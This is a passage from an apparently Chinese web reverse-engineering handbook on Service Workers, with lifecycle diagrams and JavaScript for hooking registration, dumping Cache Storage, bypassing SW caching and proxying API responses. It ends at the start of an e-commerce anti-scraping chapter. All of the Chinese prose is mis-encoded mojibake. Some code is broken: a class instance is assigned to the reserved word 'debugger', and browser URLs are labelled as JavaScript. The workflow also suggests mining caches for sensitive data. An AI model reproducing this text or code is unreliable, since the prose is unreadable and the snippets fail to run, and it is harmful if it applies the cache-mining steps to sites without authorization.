<p><strong>Service Worker</strong> æ˜¯ PWA çš„æ ¸å¿ƒæŠ€æœ¯ï¼Œæ˜¯è¿è¡Œåœ¨æµè§ˆå™¨åå°çš„è„šæœ¬ï¼š</p>
<ul>
<li>ç‹¬ç«‹äºç½‘é¡µçš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>å¯ä»¥æ‹¦æˆªå’Œå¤„ç†ç½‘ç»œè¯·æ±‚</li>
<li>å®ç°ç¦»çº¿ç¼“å­˜å’Œç­–ç•¥</li>
<li>æ— æ³•ç›´æ¥è®¿é—® DOM</li>
<li>ä½¿ç”¨ Promise è¿›è¡Œå¼‚æ­¥æ“ä½œ</li>
</ul>
<h3>æ ¸å¿ƒåŸç†</h3>
<h4>Service Worker ç”Ÿå‘½å‘¨æœŸ</h4>
<pre><code class="language-mermaid">stateDiagram-v2
    [*] --&gt; Parsed: é¡µé¢åŠ è½½ SW è„šæœ¬

    Parsed --&gt; Installing: navigator.serviceWorker&lt;br/&gt;.register()
    Installing --&gt; Installed: install äº‹ä»¶å®Œæˆ&lt;br/&gt;waitUntil() Promise è§£å†³

    Installed --&gt; Activating: æ—§ SW åœæ­¢ æˆ–&lt;br/&gt;skipWaiting()
    Activating --&gt; Activated: activate äº‹ä»¶å®Œæˆ&lt;br/&gt;waitUntil() Promise è§£å†³

    Activated --&gt; Idle: å‡†å¤‡å°±ç»ª
    Idle --&gt; Fetch: æ‹¦æˆªç½‘ç»œè¯·æ±‚
    Idle --&gt; Message: æ¥æ”¶é¡µé¢æ¶ˆæ¯
    Idle --&gt; Push: æ¥æ”¶æ¨é€é€šçŸ¥
    Idle --&gt; Sync: åå°åŒæ­¥è§¦å‘

    Fetch --&gt; Idle: å¤„ç†å®Œæˆ
    Message --&gt; Idle: å¤„ç†å®Œæˆ
    Push --&gt; Idle: å¤„ç†å®Œæˆ
    Sync --&gt; Idle: å¤„ç†å®Œæˆ

    Idle --&gt; Redundant: unregister() æˆ–&lt;br/&gt;è¢«æ–° SW æ›¿æ¢
    Redundant --&gt; [*]

    note right of Installing
        è§¦å‘: install äº‹ä»¶
        æ“ä½œ:
        - ç¼“å­˜é™æ€èµ„æº
        - åˆå§‹åŒ–æ•°æ®åº“
    end note

    note right of Activating
        è§¦å‘: activate äº‹ä»¶
        æ“ä½œ:
        - æ¸…ç†æ—§ç¼“å­˜
        - è¿ç§»æ•°æ®
        - clients.claim()
    end note

    note right of Idle
        è¿è¡ŒçŠ¶æ€
        ç›‘å¬äº‹ä»¶:
        - fetch (è¯·æ±‚æ‹¦æˆª)
        - message (æ¶ˆæ¯)
        - push (æ¨é€)
        - sync (åå°åŒæ­¥)
    end note
</code></pre>
<h4>Service Worker ä¸é¡µé¢äº¤äº’æµç¨‹</h4>
<pre><code class="language-mermaid">sequenceDiagram
    participant Page as ç½‘é¡µ&lt;br/&gt;(Main Thread)
    participant SW as Service Worker&lt;br/&gt;(Worker Thread)
    participant Cache as Cache Storage
    participant Network as ç½‘ç»œæœåŠ¡å™¨

    Note over Page,Network: 1. æ³¨å†Œé˜¶æ®µ
    Page-&gt;&gt;SW: navigator.serviceWorker.register('/sw.js')
    activate SW
    Note over SW: Parsed â†’ Installing

    SW-&gt;&gt;SW: install äº‹ä»¶è§¦å‘
    SW-&gt;&gt;Cache: cache.addAll([é™æ€èµ„æº])
    Cache--&gt;&gt;SW: ç¼“å­˜å®Œæˆ
    Note over SW: Installing â†’ Installed

    SW-&gt;&gt;SW: activate äº‹ä»¶è§¦å‘
    SW-&gt;&gt;Cache: æ¸…ç†æ—§ç¼“å­˜ç‰ˆæœ¬
    SW-&gt;&gt;Page: clients.claim() æ§åˆ¶é¡µé¢
    Note over SW: Installed â†’ Activated â†’ Idle
    deactivate SW

    Note over Page,Network: 2. è¿è¡Œé˜¶æ®µ - è¯·æ±‚æ‹¦æˆª

    Page-&gt;&gt;SW: fetch('/api/data')
    activate SW
    Note over SW: fetch äº‹ä»¶è§¦å‘

    SW-&gt;&gt;Cache: caches.match(request)
    Cache--&gt;&gt;SW: ç¼“å­˜å‘½ä¸­/æœªå‘½ä¸­

    alt ç¼“å­˜å‘½ä¸­
        SW--&gt;&gt;Page: è¿”å›ç¼“å­˜å“åº” âš¡
    else ç¼“å­˜æœªå‘½ä¸­
        SW-&gt;&gt;Network: fetch(request)
        Network--&gt;&gt;SW: ç½‘ç»œå“åº”
        SW-&gt;&gt;Cache: cache.put(request, response)
        SW--&gt;&gt;Page: è¿”å›ç½‘ç»œå“åº”
    end
    deactivate SW

    Note over Page,Network: 3. æ¶ˆæ¯é€šä¿¡

    Page-&gt;&gt;SW: postMessage({type: 'SKIP_WAITING'})
    activate SW
    SW-&gt;&gt;SW: message äº‹ä»¶è§¦å‘
    SW-&gt;&gt;SW: self.skipWaiting()
    SW--&gt;&gt;Page: postMessage({type: 'ACTIVATED'})
    deactivate SW

    Note over Page,Network: 4. åå°åŠŸèƒ½

    Network-&gt;&gt;SW: Push é€šçŸ¥
    activate SW
    SW-&gt;&gt;SW: push äº‹ä»¶è§¦å‘
    SW-&gt;&gt;Page: showNotification()
    deactivate SW

    SW-&gt;&gt;SW: sync äº‹ä»¶è§¦å‘
    activate SW
    SW-&gt;&gt;Network: åå°æ•°æ®åŒæ­¥
    deactivate SW
</code></pre>
<p><strong>ç”Ÿå‘½å‘¨æœŸäº‹ä»¶</strong>:</p>
<ol>
<li><strong>install</strong>: Service Worker é¦–æ¬¡å®‰è£…æ—¶è§¦å‘ï¼Œç”¨äºç¼“å­˜å…³é”®èµ„æº</li>
<li><strong>activate</strong>: Service Worker æ¿€æ´»æ—¶è§¦å‘ï¼Œç”¨äºæ¸…ç†æ—§ç¼“å­˜å’Œæ•°æ®è¿ç§»</li>
<li><strong>fetch</strong>: æ¯æ¬¡ç½‘ç»œè¯·æ±‚æ—¶è§¦å‘ï¼ˆå¦‚æœæ³¨å†Œäº†ï¼‰ï¼Œå®ç°è¯·æ±‚æ‹¦æˆªå’Œç¼“å­˜ç­–ç•¥</li>
<li><strong>message</strong>: æ¥æ”¶æ¥è‡ªé¡µé¢çš„æ¶ˆæ¯ï¼Œå®ç°åŒå‘é€šä¿¡</li>
<li><strong>push</strong>: æ¥æ”¶æ¨é€é€šçŸ¥ï¼Œå³ä½¿é¡µé¢æœªæ‰“å¼€ä¹Ÿèƒ½æ”¶åˆ°</li>
<li><strong>sync</strong>: åå°åŒæ­¥ï¼Œåœ¨ç½‘ç»œæ¢å¤æ—¶åŒæ­¥æ•°æ®</li>
</ol>
<hr />
<h2>è¯¦ç»†å†…å®¹</h2>
<h3>Service Worker æ³¨å†Œä¸æ£€æµ‹</h3>
<h4>1. <strong>æ£€æµ‹å·²æ³¨å†Œçš„ Service Worker</strong></h4>
<pre><code class="language-javascript">// æ£€æµ‹å½“å‰é¡µé¢æ˜¯å¦æœ‰ Service Worker
if (&quot;serviceWorker&quot; in navigator) {
  navigator.serviceWorker.getRegistrations().then((registrations) =&gt; {
    console.log(&quot;Found Service Workers:&quot;, registrations.length);

    registrations.forEach((registration, index) =&gt; {
      console.log(`Service Worker ${index + 1}:`);
      console.log(&quot;  Scope:&quot;, registration.scope);
      console.log(&quot;  Active:&quot;, registration.active);
      console.log(&quot;  Waiting:&quot;, registration.waiting);
      console.log(&quot;  Installing:&quot;, registration.installing);

      if (registration.active) {
        console.log(&quot;  Script URL:&quot;, registration.active.scriptURL);
        console.log(&quot;  State:&quot;, registration.active.state);
      }
    });
  });
}
</code></pre>
<h4>2. <strong>ç›‘æ§ Service Worker çŠ¶æ€</strong></h4>
<pre><code class="language-javascript">if (&quot;serviceWorker&quot; in navigator) {
  navigator.serviceWorker.ready.then((registration) =&gt; {
    console.log(&quot;Service Worker is ready&quot;);
    console.log(&quot;Scope:&quot;, registration.scope);

    // ç›‘å¬çŠ¶æ€å˜åŒ–
    if (registration.active) {
      registration.active.addEventListener(&quot;statechange&quot;, (e) =&gt; {
        console.log(&quot;Service Worker state changed:&quot;, e.target.state);
      });
    }
  });

  // ç›‘å¬æ›´æ–°
  navigator.serviceWorker.addEventListener(&quot;updatefound&quot;, () =&gt; {
    console.log(&quot;Service Worker update found&quot;);
  });

  // ç›‘å¬æ§åˆ¶å™¨å˜åŒ–
  navigator.serviceWorker.addEventListener(&quot;controllerchange&quot;, () =&gt; {
    console.log(&quot;Service Worker controller changed&quot;);
  });
}
</code></pre>
<h3>æ‹¦æˆªå’Œåˆ†æè¯·æ±‚</h3>
<h4>1. <strong>è¯»å– Service Worker è„šæœ¬</strong></h4>
<pre><code class="language-javascript">// è·å– Service Worker è„šæœ¬å†…å®¹
async function fetchServiceWorkerScript(registration) {
  if (!registration.active) {
    console.log(&quot;No active Service Worker&quot;);
    return;
  }

  const scriptURL = registration.active.scriptURL;
  console.log(&quot;Fetching Service Worker script:&quot;, scriptURL);

  try {
    const response = await fetch(scriptURL);
    const script = await response.text();
    console.log(&quot;Service Worker script:&quot;);
    console.log(script);
    return script;
  } catch (e) {
    console.error(&quot;Failed to fetch Service Worker:&quot;, e);
  }
}

// ä½¿ç”¨
navigator.serviceWorker.getRegistrations().then((registrations) =&gt; {
  if (registrations.length &gt; 0) {
    fetchServiceWorkerScript(registrations[0]);
  }
});
</code></pre>
<h4>2. <strong>Hook Service Worker æ³¨å†Œ</strong></h4>
<pre><code class="language-javascript">// æ‹¦æˆª Service Worker æ³¨å†Œ
(function () {
  const originalRegister = navigator.serviceWorker.register;

  navigator.serviceWorker.register = function (scriptURL, options) {
    console.log(&quot;[SW Register] Intercepted:&quot;, scriptURL, options);

    // å¯ä»¥ä¿®æ”¹è„šæœ¬ URL æˆ–é€‰é¡¹
    return originalRegister
      .call(this, scriptURL, options)
      .then((registration) =&gt; {
        console.log(&quot;[SW Register] Success:&quot;, registration);

        // ç›‘å¬å®‰è£…å’Œæ¿€æ´»
        if (registration.installing) {
          registration.installing.addEventListener(&quot;statechange&quot;, function (e) {
            console.log(&quot;[SW State]&quot;, e.target.state);
          });
        }

        return registration;
      });
  };
})();
</code></pre>
<h4>3. <strong>ç›‘å¬ Service Worker æ¶ˆæ¯</strong></h4>
<pre><code class="language-javascript">// å‘é€æ¶ˆæ¯åˆ° Service Worker
navigator.serviceWorker.controller?.postMessage({
  type: &quot;GET_CACHE_INFO&quot;,
  timestamp: Date.now(),
});

// æ¥æ”¶æ¥è‡ª Service Worker çš„æ¶ˆæ¯
navigator.serviceWorker.addEventListener(&quot;message&quot;, (event) =&gt; {
  console.log(&quot;Message from Service Worker:&quot;, event.data);
});
</code></pre>
<h3>ç¼“å­˜åˆ†æ</h3>
<h4>1. <strong>æšä¸¾æ‰€æœ‰ç¼“å­˜</strong></h4>
<pre><code class="language-javascript">async function listAllCaches() {
  if (!(&quot;caches&quot; in window)) {
    console.log(&quot;Cache API not supported&quot;);
    return;
  }

  const cacheNames = await caches.keys();
  console.log(&quot;Found caches:&quot;, cacheNames);

  for (const cacheName of cacheNames) {
    console.log(`\n=== Cache: ${cacheName} ===`);
    const cache = await caches.open(cacheName);
    const keys = await cache.keys();

    console.log(`Total entries: ${keys.length}`);
    keys.forEach((request, i) =&gt; {
      console.log(`  ${i + 1}. ${request.url}`);
    });
  }
}

listAllCaches();
</code></pre>
<h4>2. <strong>è¯»å–ç¼“å­˜å†…å®¹</strong></h4>
<pre><code class="language-javascript">async function dumpCacheContent(cacheName, urlPattern) {
  const cache = await caches.open(cacheName);
  const keys = await cache.keys();

  for (const request of keys) {
    if (!urlPattern || request.url.includes(urlPattern)) {
      const response = await cache.match(request);
      const headers = {};
      response.headers.forEach((value, key) =&gt; {
        headers[key] = value;
      });

      console.log(&quot;URL:&quot;, request.url);
      console.log(&quot;Status:&quot;, response.status);
      console.log(&quot;Headers:&quot;, headers);

      // æ ¹æ®å†…å®¹ç±»å‹è¯»å–å“åº”ä½“
      const contentType = response.headers.get(&quot;content-type&quot;);
      if (contentType?.includes(&quot;json&quot;)) {
        const json = await response.clone().json();
        console.log(&quot;JSON:&quot;, json);
      } else if (
        contentType?.includes(&quot;text&quot;) ||
        contentType?.includes(&quot;javascript&quot;)
      ) {
        const text = await response.clone().text();
        console.log(&quot;Text:&quot;, text.substring(0, 500));
      } else {
        const blob = await response.clone().blob();
        console.log(&quot;Blob size:&quot;, blob.size, &quot;bytes&quot;);
      }
      console.log(&quot;---&quot;);
    }
  }
}

// ä½¿ç”¨
dumpCacheContent(&quot;my-cache-v1&quot;, &quot;api&quot;);
</code></pre>
<h4>3. <strong>æ¸…é™¤ç‰¹å®šç¼“å­˜</strong></h4>
<pre><code class="language-javascript">async function clearCache(cacheName) {
  const deleted = await caches.delete(cacheName);
  console.log(`Cache &quot;${cacheName}&quot; deleted:`, deleted);
}

async function clearAllCaches() {
  const cacheNames = await caches.keys();
  await Promise.all(cacheNames.map((name) =&gt; caches.delete(name)));
  console.log(&quot;All caches cleared&quot;);
}
</code></pre>
<h3>Service Worker å†…éƒ¨ä»£ç ç¤ºä¾‹</h3>
<h4>å…¸å‹çš„ Service Worker ç»“æ„</h4>
<pre><code class="language-javascript">// service-worker.js

const CACHE_NAME = &quot;my-app-v1&quot;;
const urlsToCache = [&quot;/&quot;, &quot;/styles/main.css&quot;, &quot;/scripts/app.js&quot;];

// å®‰è£…äº‹ä»¶ - ç¼“å­˜èµ„æº
self.addEventListener(&quot;install&quot;, (event) =&gt; {
  console.log(&quot;[SW] Installing...&quot;);

  event.waitUntil(
    caches
      .open(CACHE_NAME)
      .then((cache) =&gt; {
        console.log(&quot;[SW] Caching app shell&quot;);
        return cache.addAll(urlsToCache);
      })
      .then(() =&gt; self.skipWaiting()) // ç«‹å³æ¿€æ´»
  );
});

// æ¿€æ´»äº‹ä»¶ - æ¸…ç†æ—§ç¼“å­˜
self.addEventListener(&quot;activate&quot;, (event) =&gt; {
  console.log(&quot;[SW] Activating...&quot;);

  event.waitUntil(
    caches
      .keys()
      .then((cacheNames) =&gt; {
        return Promise.all(
          cacheNames.map((cacheName) =&gt; {
            if (cacheName !== CACHE_NAME) {
              console.log(&quot;[SW] Deleting old cache:&quot;, cacheName);
              return caches.delete(cacheName);
            }
          })
        );
      })
      .then(() =&gt; self.clients.claim()) // ç«‹å³æ§åˆ¶é¡µé¢
  );
});

// Fetch äº‹ä»¶ - ç½‘ç»œè¯·æ±‚æ‹¦æˆª
self.addEventListener(&quot;fetch&quot;, (event) =&gt; {
  console.log(&quot;[SW] Fetching:&quot;, event.request.url);

  event.respondWith(
    // ç¼“å­˜ä¼˜å…ˆç­–ç•¥
    caches.match(event.request).then((response) =&gt; {
      if (response) {
        console.log(&quot;[SW] Cache hit:&quot;, event.request.url);
        return response;
      }

      console.log(&quot;[SW] Cache miss, fetching:&quot;, event.request.url);
      return fetch(event.request).then((response) =&gt; {
        // ç¼“å­˜æ–°å“åº”
        if (response.status === 200) {
          const responseClone = response.clone();
          caches.open(CACHE_NAME).then((cache) =&gt; {
            cache.put(event.request, responseClone);
          });
        }
        return response;
      });
    })
  );
});

// æ¶ˆæ¯å¤„ç†
self.addEventListener(&quot;message&quot;, (event) =&gt; {
  console.log(&quot;[SW] Message received:&quot;, event.data);

  if (event.data.type === &quot;SKIP_WAITING&quot;) {
    self.skipWaiting();
  }

  // å›å¤æ¶ˆæ¯
  event.ports[0].postMessage({
    type: &quot;PONG&quot;,
    timestamp: Date.now(),
  });
});
</code></pre>
<hr />
<h2>å®æˆ˜ç¤ºä¾‹</h2>
<h3>ç¤ºä¾‹ 1: Service Worker è°ƒè¯•å·¥å…·</h3>
<pre><code class="language-javascript">class ServiceWorkerDebugger {
    constructor() {
        this.registrations = [];
    }

    async init() {
        if (!('serviceWorker' in navigator)) {
            console.error('Service Worker not supported');
            return;
        }

        this.registrations = await navigator.serviceWorker.getRegistrations();
        this.setupListeners();
        await this.analyze();
    }

    setupListeners() {
        // ç›‘å¬æ–°çš„ Service Worker
        navigator.serviceWorker.addEventListener('controllerchange', () =&gt; {
            console.log('[Debugger] Controller changed');
            this.analyze();
        });

        // ç›‘å¬æ¶ˆæ¯
        navigator.serviceWorker.addEventListener('message', event =&gt; {
            console.log('[Debugger] Message:', event.data);
        });
    }

    async analyze() {
        console.log('=== Service Worker Analysis ===');
        console.log(`Found ${this.registrations.length} registration(s)`);

        for (const reg of this.registrations) {
            console.log('\nRegistration:');
            console.log('  Scope:', reg.scope);

            if (reg.active) {
                console.log('  Active:', reg.active.scriptURL);
                await this.analyzeWorker(reg.active);
            }

            if (reg.waiting) {
                console.log('  Waiting:', reg.waiting.scriptURL);
            }

            if (reg.installing) {
                console.log('  Installing:', reg.installing.scriptURL);
            }
        }

        await this.analyzeCaches();
    }

    async analyzeWorker(worker) {
        try {
            const response = await fetch(worker.scriptURL);
            const code = await response.text();

            console.log('  Script size:', code.length, 'bytes');

            // åˆ†æä»£ç ç‰¹å¾
            const features = {
                hasInstallListener: code.includes(&quot;addEventListener('install'&quot;),
                hasActivateListener: code.includes(&quot;addEventListener('activate'&quot;),
                hasFetchListener: code.includes(&quot;addEventListener('fetch'&quot;),
                hasMessageListener: code.includes(&quot;addEventListener('message'&quot;),
                hasPushListener: code.includes(&quot;addEventListener('push'&quot;),
                usesCacheAPI: code.includes('caches.'),
                usesIndexedDB: code.includes('indexedDB'),
                hasWorkbox: code.includes('workbox')
            };

            console.log('  Features:', features);
        } catch(e) {
            console.error('  Failed to analyze:', e);
        }
    }

    async analyzeCaches() {
        console.log('\n=== Cache Analysis ===');
        const cacheNames = await caches.keys();
        console.log(`Found ${cacheNames.length} cache(s)`);

        for (const name of cacheNames) {
            const cache = await caches.open(name);
            const keys = await cache.keys();
            console.log(`\n${name}: ${keys.length} entries`);

            // æ˜¾ç¤ºå‰5ä¸ªæ¡ç›®
            for (let i = 0; i &lt; Math.min(5, keys.length); i++) {
                console.log(`  - ${keys[i].url}`);
            }
            if (keys.length &gt; 5) {
                console.log(`  ... and ${keys.length - 5} more`);
            }
        }
    }

    async sendMessage(data) {
        if (!navigator.serviceWorker.controller) {
            console.error('No active Service Worker controller');
            return;
        }

        const channel = new MessageChannel();

        return new Promise((resolve, reject) =&gt; {
            channel.port1.onmessage = event =&gt; {
                resolve(event.data);
            };

            navigator.serviceWorker.controller.postMessage(data, [channel.port2]);

            setTimeout(() =&gt; reject('Timeout'), 5000);
        });
    }

    async unregisterAll() {
        for (const reg of this.registrations) {
            await reg.unregister();
            console.log('Unregistered:', reg.scope);
        }
    }
}

// ä½¿ç”¨
const debugger = new ServiceWorkerDebugger();
debugger.init();
</code></pre>
<h3>ç¤ºä¾‹ 2: ç»•è¿‡ Service Worker ç¼“å­˜</h3>
<pre><code class="language-javascript">// æ–¹æ³•1: å¼ºåˆ¶ç»•è¿‡ç¼“å­˜
async function bypassServiceWorkerCache(url) {
  return fetch(url, {
    cache: &quot;no-store&quot;,
    headers: {
      &quot;Cache-Control&quot;: &quot;no-cache&quot;,
      Pragma: &quot;no-cache&quot;,
    },
  });
}

// æ–¹æ³•2: ä¸´æ—¶æ³¨é”€ Service Worker
async function fetchWithoutServiceWorker(url) {
  const registrations = await navigator.serviceWorker.getRegistrations();

  // ä¿å­˜æ³¨å†Œä¿¡æ¯
  const savedRegs = registrations.map((r) =&gt; ({
    scriptURL: r.active?.scriptURL,
    scope: r.scope,
  }));

  // æ³¨é”€æ‰€æœ‰ Service Worker
  await Promise.all(registrations.map((r) =&gt; r.unregister()));

  // æ‰§è¡Œè¯·æ±‚
  const response = await fetch(url);

  // é‡æ–°æ³¨å†Œ Service Worker
  for (const reg of savedRegs) {
    if (reg.scriptURL) {
      await navigator.serviceWorker.register(reg.scriptURL, {
        scope: reg.scope,
      });
    }
  }

  return response;
}

// æ–¹æ³•3: ä½¿ç”¨ iframe ç»•è¿‡
async function fetchInIframe(url) {
  return new Promise((resolve, reject) =&gt; {
    const iframe = document.createElement(&quot;iframe&quot;);
    iframe.style.display = &quot;none&quot;;
    iframe.src = &quot;about:blank&quot;;

    iframe.onload = async () =&gt; {
      try {
        const response = await iframe.contentWindow.fetch(url);
        const data = await response.text();
        resolve(data);
      } catch (e) {
        reject(e);
      } finally {
        document.body.removeChild(iframe);
      }
    };

    document.body.appendChild(iframe);
  });
}
</code></pre>
<h3>ç¤ºä¾‹ 3: Service Worker ä»£ç†</h3>
<pre><code class="language-javascript">// æ³¨å†Œä¸€ä¸ªè‡ªå®šä¹‰çš„ Service Worker æ¥æ‹¦æˆªå’Œä¿®æ”¹è¯·æ±‚

// proxy-sw.js
self.addEventListener(&quot;fetch&quot;, (event) =&gt; {
  const url = new URL(event.request.url);

  // æ‹¦æˆª API è¯·æ±‚
  if (url.pathname.startsWith(&quot;/api/&quot;)) {
    event.respondWith(
      fetch(event.request).then((response) =&gt; {
        // å…‹éš†å“åº”ä»¥ä¾¿è¯»å–
        const clonedResponse = response.clone();

        // è®°å½•å“åº”
        clonedResponse.json().then((data) =&gt; {
          console.log(&quot;[Proxy SW] API Response:&quot;, url.pathname, data);

          // å‘é€åˆ°ä¸»çº¿ç¨‹
          self.clients.matchAll().then((clients) =&gt; {
            clients.forEach((client) =&gt; {
              client.postMessage({
                type: &quot;API_RESPONSE&quot;,
                url: url.href,
                data: data,
              });
            });
          });
        });

        return response;
      })
    );
    return;
  }

  // é»˜è®¤è¡Œä¸º
  event.respondWith(fetch(event.request));
});

// ä¸»é¡µé¢ä¸­æ³¨å†Œ
navigator.serviceWorker.register(&quot;/proxy-sw.js&quot;, { scope: &quot;/&quot; });

// ç›‘å¬æ‹¦æˆªçš„æ•°æ®
navigator.serviceWorker.addEventListener(&quot;message&quot;, (event) =&gt; {
  if (event.data.type === &quot;API_RESPONSE&quot;) {
    console.log(&quot;Intercepted API call:&quot;, event.data.url);
    console.log(&quot;Data:&quot;, event.data.data);
  }
});
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>é€†å‘åˆ†ææµç¨‹</h3>
<ol>
<li><p><strong>æ£€æµ‹ Service Worker å­˜åœ¨</strong></p>
<ul>
<li>æ£€æŸ¥ <code>navigator.serviceWorker</code> API</li>
<li>æŸ¥çœ‹å¼€å‘è€…å·¥å…· Application é¢æ¿</li>
<li>æšä¸¾æ‰€æœ‰æ³¨å†Œ</li>
</ul>
</li>
<li><p><strong>æå– Service Worker è„šæœ¬</strong></p>
<ul>
<li>è·å–è„šæœ¬ URL</li>
<li>ä¸‹è½½å¹¶åˆ†æä»£ç </li>
<li>è¯†åˆ«ç¼“å­˜ç­–ç•¥</li>
</ul>
</li>
<li><p><strong>åˆ†æç¼“å­˜å†…å®¹</strong></p>
<ul>
<li>æšä¸¾æ‰€æœ‰ç¼“å­˜</li>
<li>æå–ç¼“å­˜çš„ API å“åº”</li>
<li>å¯»æ‰¾æ•æ„Ÿæ•°æ®</li>
</ul>
</li>
<li><p><strong>ç›‘æ§ç½‘ç»œæ‹¦æˆª</strong></p>
<ul>
<li>è¯†åˆ«è¢«æ‹¦æˆªçš„è¯·æ±‚</li>
<li>åˆ†æè¯·æ±‚/å“åº”ä¿®æ”¹</li>
<li>ç»•è¿‡ç¼“å­˜æœºåˆ¶</li>
</ul>
</li>
</ol>
<h3>å®‰å…¨è€ƒè™‘</h3>
<p><strong>ä½œä¸ºå¼€å‘è€…</strong>:</p>
<ol>
<li><p><strong>ä¸è¦ç¼“å­˜æ•æ„Ÿæ•°æ®</strong></p>
<ul>
<li>é¿å…ç¼“å­˜åŒ…å« Token çš„ API å“åº”</li>
<li>ä¸è¦ç¼“å­˜ç”¨æˆ·ä¸ªäººä¿¡æ¯</li>
</ul>
</li>
<li><p><strong>å®æ–½ç¼“å­˜ç‰ˆæœ¬æ§åˆ¶</strong></p>
<ul>
<li>æ›´æ–°æ—¶æ¸…ç†æ—§ç¼“å­˜</li>
<li>ä½¿ç”¨ç‰ˆæœ¬å·å‘½åç¼“å­˜</li>
</ul>
</li>
<li><p><strong>éªŒè¯ Service Worker æ¥æº</strong></p>
<ul>
<li>ä½¿ç”¨ HTTPS</li>
<li>å®æ–½ CSP é™åˆ¶</li>
</ul>
</li>
</ol>
<p><strong>ä½œä¸ºç ”ç©¶è€…</strong>:</p>
<ol>
<li><p><strong>åˆæ³•æˆæƒ</strong></p>
<ul>
<li>ä»…åœ¨æˆæƒèŒƒå›´å†…åˆ†æ</li>
<li>éµå®ˆè´Ÿè´£ä»»æŠ«éœ²åŸåˆ™</li>
</ul>
</li>
<li><p><strong>éšç§ä¿æŠ¤</strong></p>
<ul>
<li>ä¸è¦æ³„éœ²ç”¨æˆ·æ•°æ®</li>
<li>æµ‹è¯•æ—¶ä½¿ç”¨æµ‹è¯•è´¦å·</li>
</ul>
</li>
</ol>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q: Service Worker èƒ½è®¿é—® Cookie å—ï¼Ÿ</h3>
<p><strong>A</strong>: Service Worker æ— æ³•ç›´æ¥è®¿é—® <code>document.cookie</code>ï¼Œä½†ï¼š</p>
<ul>
<li>Fetch è¯·æ±‚ä¼šè‡ªåŠ¨æºå¸¦ Cookie</li>
<li>å¯ä»¥é€šè¿‡æ‹¦æˆªè¯·æ±‚è¯»å– <code>Cookie</code> å¤´</li>
<li>å¯ä»¥è®¾ç½®å“åº”çš„ <code>Set-Cookie</code> å¤´ï¼ˆå—åŒæºç­–ç•¥é™åˆ¶ï¼‰</li>
</ul>
<h3>Q: å¦‚ä½•è°ƒè¯• Service Workerï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ol>
<li><p><strong>Chrome DevTools</strong>:</p>
<ul>
<li>Application â†’ Service Workers</li>
<li>å¯ä»¥å¯åŠ¨/åœæ­¢ã€æ›´æ–°ã€æ³¨é”€</li>
<li>å¯ä»¥åœ¨ Sources ä¸­è®¾ç½®æ–­ç‚¹</li>
</ul>
</li>
<li><p><strong>Firefox DevTools</strong>:</p>
<ul>
<li>about:debugging â†’ This Firefox â†’ Service Workers</li>
<li>å¯ä»¥å¯åŠ¨å’Œæ³¨é”€</li>
</ul>
</li>
<li><p><strong>ç¼–ç¨‹æ–¹å¼</strong>:</p>
<pre><code class="language-javascript">chrome://inspect/#service-workers  // Chrome
about:debugging#/runtime/this-firefox  // Firefox
</code></pre>
</li>
</ol>
<h3>Q: Service Worker èƒ½è¢«ç¦ç”¨å—ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ul>
<li>ç”¨æˆ·å¯ä»¥åœ¨æµè§ˆå™¨è®¾ç½®ä¸­ç¦ç”¨</li>
<li>å¼€å‘è€…å¯ä»¥é€šè¿‡ <code>unregister()</code> æ³¨é”€</li>
<li>æŸäº›æµè§ˆå™¨æ‰©å±•å¯ä»¥é˜»æ­¢ Service Worker</li>
</ul>
<h3>Q: Service Worker çš„ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>A</strong>:
Service Worker çš„ä½œç”¨åŸŸï¼ˆscopeï¼‰å†³å®šäº†å®ƒèƒ½æ§åˆ¶å“ªäº›é¡µé¢ï¼š</p>
<pre><code class="language-javascript">// åªèƒ½æ§åˆ¶ /app/ ä¸‹çš„é¡µé¢
navigator.serviceWorker.register(&quot;/sw.js&quot;, { scope: &quot;/app/&quot; });

// é»˜è®¤ä½œç”¨åŸŸæ˜¯è„šæœ¬æ‰€åœ¨ç›®å½•
navigator.serviceWorker.register(&quot;/scripts/sw.js&quot;); // scope = '/scripts/'
</code></pre>
<hr />
<h2>è¿›é˜¶é˜…è¯»</h2>
<h3>å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API">Service Worker API - MDN</a></li>
<li><a href="https://web.dev/progressive-web-apps/">PWA æ–‡æ¡£ - web.dev</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Cache">Cache API - MDN</a></li>
</ul>
<h3>å·¥å…·ä¸åº“</h3>
<ul>
<li><a href="https://developers.google.com/web/tools/workbox">Workbox</a> - Google çš„ Service Worker åº“</li>
<li><a href="https://github.com/GoogleChromeLabs/sw-toolbox">sw-toolbox</a> - Service Worker å·¥å…·ç®±</li>
<li><a href="https://www.pwabuilder.com/">PWA Builder</a> - PWA ç”Ÿæˆå™¨</li>
</ul>
<h3>å®‰å…¨ç ”ç©¶</h3>
<ul>
<li><a href="https://w3c.github.io/ServiceWorker/#security-considerations">Service Worker Security</a></li>
<li><a href="https://web.dev/pwa-security/">PWA Security Best Practices</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li>æµè§ˆå™¨è°ƒè¯•æŠ€å·§</li>
<li>ç¦»çº¿å­˜å‚¨åˆ†æ</li>
<li><a href="#section-39">CSP ç»•è¿‡æŠ€æœ¯</a></li>
<li>Web Worker åˆ†æ</li>
</ul>

                                            </div>
                                            </div>
                    <div class="chapter">
                        <h1 class="no-page-break">Part VI: Complete Menus</h1>
                    
                                            <div class="section" id="section-45">
                                                <h2>[R44] E-commerce</h2>
                                                <h1>R44: ç”µå•†ç½‘ç«™é€†å‘æ¡ˆä¾‹</h1>
<h2>æ¦‚è¿°</h2>
<p>ç”µå•†ç½‘ç«™é€šå¸¸å…·æœ‰å¤æ‚çš„åçˆ¬è™«æœºåˆ¶ï¼ŒåŒ…æ‹¬ API ç­¾åã€åŠ å¯†ä»·æ ¼ã€æ»‘å—éªŒè¯ç ç­‰ã€‚æœ¬æ–‡é€šè¿‡å®é™…æ¡ˆä¾‹ä»‹ç»ç”µå•†ç½‘ç«™çš„é€†å‘æ€è·¯ã€‚</p>
<hr />
<h2>æ¡ˆä¾‹ä¸€ï¼šå•†å“ä»·æ ¼åŠ å¯†</h2>
<h3>èƒŒæ™¯</h3>
